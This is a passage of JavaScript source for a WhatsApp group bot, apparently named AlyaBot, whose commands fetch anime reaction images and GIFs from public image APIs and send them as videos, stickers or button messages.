        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/handhold`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} handheld themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} handheld @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
                case 'spank': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/spank`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} spanked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} spanked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'feed': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/feed`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} fed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} fed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
                case 'tickle': {

        if (!m.isGroup) return AlyaStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygcalya(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/tickle`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} tickled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} tickled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          AlyaBotInc.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
case 'shinobu':{
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhandhold': {
axios.get(`https://api.waifu.pics/sfw/handhold`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickshinobu': {
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhighfive': {
axios.get(`https://api.waifu.pics/sfw/highfive`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcuddle': {
axios.get(`https://api.waifu.pics/sfw/cuddle`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcringe': {
axios.get(`https://api.waifu.pics/sfw/cringe`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickdance': {
axios.get(`https://api.waifu.pics/sfw/dance`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhappy': {
axios.get(`https://api.waifu.pics/sfw/happy`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickglomp': {
axios.get(`https://api.waifu.pics/sfw/glomp`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmug': {
axios.get(`https://api.waifu.pics/sfw/smug`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickblush': {
axios.get(`https://api.waifu.pics/sfw/blush`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickawoo': {
axios.get(`https://api.waifu.pics/sfw/awoo`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwave': {
axios.get(`https://api.waifu.pics/sfw/wave`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmile': {
axios.get(`https://api.waifu.pics/sfw/smile`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickslap': {
axios.get(`https://api.waifu.pics/sfw/slap`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticknom': {
axios.get(`https://api.waifu.pics/sfw/nom`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpoke': {
axios.get(`https://api.waifu.pics/sfw/poke`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwink': {
axios.get(`https://api.waifu.pics/sfw/wink`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbonk': {
axios.get(`https://api.waifu.pics/sfw/bonk`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbully': {
axios.get(`https://api.waifu.pics/sfw/bully`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickyeet': {
axios.get(`https://api.waifu.pics/sfw/yeet`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbite': {
axios.get(`https://api.waifu.pics/sfw/bite`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkiss': {
axios.get(`https://api.waifu.pics/sfw/kiss`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticklick': {
axios.get(`https://api.waifu.pics/sfw/lick`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpat': {
axios.get(`https://api.waifu.pics/sfw/pat`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhug': {
axios.get(`https://api.waifu.pics/sfw/hug`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkill': {
axios.get(`https://api.waifu.pics/sfw/kill`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcry': {
axios.get(`https://api.waifu.pics/sfw/cry`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickspank':{
                axios.get(`https://nekos.life/api/v2/img/spank`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticktickle':{
                axios.get(`https://nekos.life/api/v2/img/tickle`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'meow':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
AlyaBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'animeawoo':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
 let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animemegumin':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeshinobu':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehandhold':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehighfive':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecringe':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animedance':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehappy':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeglomp':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animesmug':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeblush':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewave':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animesmile':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animepoke':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewink':{
await AlyaStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
